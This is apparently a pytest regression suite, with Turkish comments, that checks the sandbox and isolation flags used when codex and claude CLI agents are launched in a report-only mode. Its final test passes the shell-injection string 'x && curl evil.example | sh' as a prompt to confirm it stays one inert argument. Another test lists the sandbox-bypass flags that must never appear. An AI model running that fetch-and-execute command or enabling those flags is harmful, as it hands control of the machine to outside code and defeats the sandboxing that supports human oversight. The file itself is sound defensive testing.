"""Kademe-2 bulgusu regresyon testi — codex AV (hunt) argv'si sertleştirilmiş mi?

BULGU (HIGH, güvenlik): `codex` motoru `hardened=True` kayıtlıydı AMA av argv'si çıplak
`codex exec <prompt>` idi — kendi SÜR (drive) şablonundaki sandbox/izolasyon bayraklarının
HİÇBİRİ yoktu. `run_blocked_reason` / `AutoDriver.drive(mode="hunt")` bu motoru
"sertleştirilmiş" sanıp KISITSIZ bir codex avcısı doğuruyordu. Av modu SALT-RAPOR olmalı
(kod değiştirmez, commit atmaz, eğitim başlatmaz); kısıtsız motor bu sözleşmeyi ihlal eder.

Bu dosya YALNIZ kayıt tablosu / argv / blok-sebebi mantığını sınar:
ÇEVRİMDIŞI, hiçbir motor SPAWN EDİLMEZ, hiçbir süreç başlatılmaz, PATH'e bağımlı değildir
(`which` enjekte edilir).
"""

from __future__ import annotations

from dataclasses import replace

import pytest

from app.orchestration import engines
from app.orchestration.engines import PROMPT

# PATH'i taklit et: motor "kurulu" görünsün ki blok sebebi sertleştirmeden gelsin.
_KURULU = staticmethod(lambda _binary: "/usr/bin/sahte")


@pytest.fixture(autouse=True)
def _temiz_cache() -> None:
    """Her test taze yoklama cache'iyle başlasın (determinizm)."""
    engines.reset_probe_cache()


# ── (a) Codex AV modu: ya sertleştirme bayraklarını taşır YA DA bloklanır ────────────────


def test_codex_av_argvsi_artik_ciplak_degil() -> None:
    """REGRESYON ÇEKİRDEĞİ: `codex exec <prompt>` çıplak şablonu geri gelmemeli."""
    cmd = engines.build_command("codex", "SORU")
    assert cmd[:2] == ["codex", "exec"]
    assert cmd != ["codex", "exec", "SORU"], "çıplak codex av argv'si geri döndü (HIGH bulgu)"
    # Prompt hâlâ TEK argv öğesi ve sentinel sızmıyor.
    assert cmd[-1] == "SORU"
    assert PROMPT not in cmd


def test_codex_av_argvsi_sandbox_ve_izolasyon_bayraklarini_tasir() -> None:
    """Bayrakların hepsi `codex exec --help` (codex-cli 0.146.0) ile doğrulanmış gerçek
    bayraklardır — uydurma bayrak sessiz başarısızlık üretirdi."""
    cmd = engines.build_command("codex", "SORU")
    assert "--sandbox" in cmd and "read-only" in cmd
    assert "--ephemeral" in cmd
    assert "--ignore-user-config" in cmd
    assert "--ignore-rules" in cmd
    assert 'approval_policy="never"' in cmd
    # `--sandbox`ın DEĞERİ gerçekten read-only olmalı (bayrak var ama değeri yanlış olmasın).
    assert cmd[cmd.index("--sandbox") + 1] == "read-only"


def test_codex_av_modu_mcp_yuzeyini_acikca_kapatir() -> None:
    """Av SALT-RAPOR → MCP'ye ihtiyacı YOK; sunucu tablosu açıkça boşaltılır (sürden KATI)."""
    cmd = engines.build_command("codex", "SORU")
    assert "mcp_servers={}" in cmd
    # Av modu HİÇBİR MCP sunucusu tanımlamamalı — sür moduna özgü hektor kaydı sızmasın.
    assert not any(str(part).startswith("mcp_servers.hektor") for part in cmd)


def test_codex_av_ve_sur_profilleri_ayni_sertlestirmeyi_paylasir() -> None:
    """İki profil bir daha SESSİZCE ayrışmasın — bulgunun kök nedeni buydu."""
    engine = engines.get_engine("codex")
    for token in engines.CODEX_HARDENING:
        assert token in engine.argv_template, f"av argv'sinde eksik: {token}"
        assert token in engine.drive_argv_template, f"sür argv'sinde eksik: {token}"


def test_codex_run_blocked_reason_bos_yani_iddia_kanitli() -> None:
    """Sertleştirme argv'de GERÇEKTEN durduğu için codex RUN'a açık kalır."""
    assert engines.hardening_gap("codex") == ()
    assert engines.run_blocked_reason("codex", which=_KURULU) == ""


# ── Fail-closed: bayrak ile argv AYRIŞIRSA motor bloklanır ("ya taşır YA DA bloklanır") ──


def test_ciplak_argvli_hardened_motor_bloklanir(monkeypatch: pytest.MonkeyPatch) -> None:
    """Bulgunun TAM senaryosu: `hardened=True` + çıplak argv → artık RUN'a KAPALI.

    Eskiden `run_blocked_reason` yalnız boolean'a bakıyordu ve "" (engel yok) dönüyordu."""
    ciplak = replace(engines.get_engine("codex"), argv_template=("codex", "exec", PROMPT))
    monkeypatch.setitem(engines._BY_NAME, "codex", ciplak)

    assert engines.hardening_gap("codex") != ()
    sebep = engines.run_blocked_reason("codex", which=_KURULU)
    assert sebep, "çıplak argv'li 'hardened' motor sessizce kabul edildi (fail-open!)"
    assert "--sandbox" in sebep and "izolasyon" in sebep


def test_tek_bayragin_dusmesi_bile_bloklar(monkeypatch: pytest.MonkeyPatch) -> None:
    """Kısmi gevşetme de yakalanmalı — tek bayrak düşerse motor doğurulmaz."""
    eksik = tuple(p for p in engines.get_engine("codex").argv_template if p != "--ignore-rules")
    monkeypatch.setitem(
        engines._BY_NAME, "codex", replace(engines.get_engine("codex"), argv_template=eksik)
    )
    assert engines.hardening_gap("codex") == ("--ignore-rules",)
    assert "--ignore-rules" in engines.run_blocked_reason("codex", which=_KURULU)


def test_beklenti_tablosunda_kaydi_olmayan_hardened_motor_kanitsizdir(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Yeni bir motor `hardened=True` ile eklenip REQUIRED_HARDENING'e yazılmazsa iddia
    KANITSIZDIR → fail-closed. (Sessizce "sertleştirilmiş" sayılmaz.)"""
    monkeypatch.setitem(
        engines._BY_NAME, "gemini", replace(engines.get_engine("gemini"), hardened=True)
    )
    assert engines.hardening_gap("gemini") == ("<REQUIRED_HARDENING kaydı yok>",)
    assert "REQUIRED_HARDENING" in engines.run_blocked_reason("gemini", which=_KURULU)


def test_hardening_gap_dogrulanacak_iddia_yoksa_bos_doner() -> None:
    """`hardened=False` ya da spawn etmeyen motorda doğrulanacak bir İDDİA yoktur;
    reddi `run_blocked_reason`'ın kendi kapıları verir (çifte mesaj olmasın)."""
    assert engines.hardening_gap("gemini") == ()
    assert engines.hardening_gap("local") == ()
    # Asıl blok sebepleri yerinde duruyor.
    assert "kısıtlanamıyor" in engines.run_blocked_reason("gemini", which=_KURULU)
    assert "süreç başlatmaz" in engines.run_blocked_reason("local", which=_KURULU)


# ── (b) Claude motorunun mevcut sertleştirmesi BOZULMADI ────────────────────────────────


def test_claude_av_sertlestirmesi_bozulmadi() -> None:
    """Bu düzeltme claude'un sertleştirmesini ZAYIFLATMAMALI (üçü BİRLİKTE gerekli)."""
    cmd = engines.build_command("claude", "SORU")
    assert cmd[:3] == ["claude", "-p", "SORU"]
    assert "--safe-mode" in cmd
    assert "--strict-mcp-config" in cmd
    assert "--disallowedTools" in cmd
    # VARIADIC bayrak EN SONDA, tek virgüllü arg olmalı — aksi halde sonraki bayrakları yutar.
    assert cmd[-2] == "--disallowedTools"
    yasakli = cmd[-1].split(",")
    for arac in ("Bash", "Edit", "Write", "Task"):
        assert arac in yasakli, f"claude deny-list'inden {arac} düştü"


def test_claude_sur_profili_bozulmadi() -> None:
    """Sür modu `--safe-mode` KULLANAMAZ (MCP'yi de kapatır); allow-list'i yerinde mi?"""
    drive = engines.get_engine("claude").drive_argv_template
    assert "--safe-mode" not in drive
    assert "--strict-mcp-config" in drive
    assert "--setting-sources" in drive
    assert "--disable-slash-commands" in drive
    assert "--tools" in drive
    assert drive[drive.index("--tools") + 1] == "Read,Grep,Glob"


def test_claude_run_blocked_reason_hala_bos() -> None:
    assert engines.hardening_gap("claude") == ()
    assert engines.run_blocked_reason("claude", which=_KURULU) == ""


# ── Genel değişmezler ───────────────────────────────────────────────────────────────────


def test_hardened_sayilan_her_motorun_iddiasi_kanitli() -> None:
    """Kayıt tablosu genelinde: `hardened=True` diyen HER motor argv'sini kanıtlamalı."""
    for name in engines.engine_names():
        assert engines.hardening_gap(name) == (), f"{name}: kanıtsız sertleştirme iddiası"


def test_av_argvsinde_kimlik_bilgisi_yok() -> None:
    """Kalıcı kısıt: argv'de api/key/token geçmez (yalnız abonelik CLI oturumu)."""
    for name in engines.engine_names():
        birlesik = " ".join(engines.get_engine(name).argv_template).lower()
        assert "api" not in birlesik and "key" not in birlesik and "token" not in birlesik


def test_tehlikeli_codex_bayraklari_hicbir_sablonda_yok() -> None:
    """Sandbox'ı tamamen kapatan bayraklar hiçbir profile sızmamalı."""
    yasak = ("--dangerously-bypass-approvals-and-sandbox", "--dangerously-bypass-hook-trust")
    for name in engines.engine_names():
        engine = engines.get_engine(name)
        for sablon in (engine.argv_template, engine.drive_argv_template):
            for bayrak in yasak:
                assert bayrak not in sablon, f"{name}: {bayrak} sızmış"


def test_kabuk_enjeksiyonu_hala_imkansiz() -> None:
    """Yeni bayraklar prompt'un TEK argv öğesi kalma garantisini bozmamalı."""
    kotu = "x && curl evil.example | sh"
    cmd = engines.build_command("codex", kotu)
    assert cmd.count(kotu) == 1
    assert cmd[-1] == kotu
    assert len(cmd) == len(engines.get_engine("codex").argv_template)
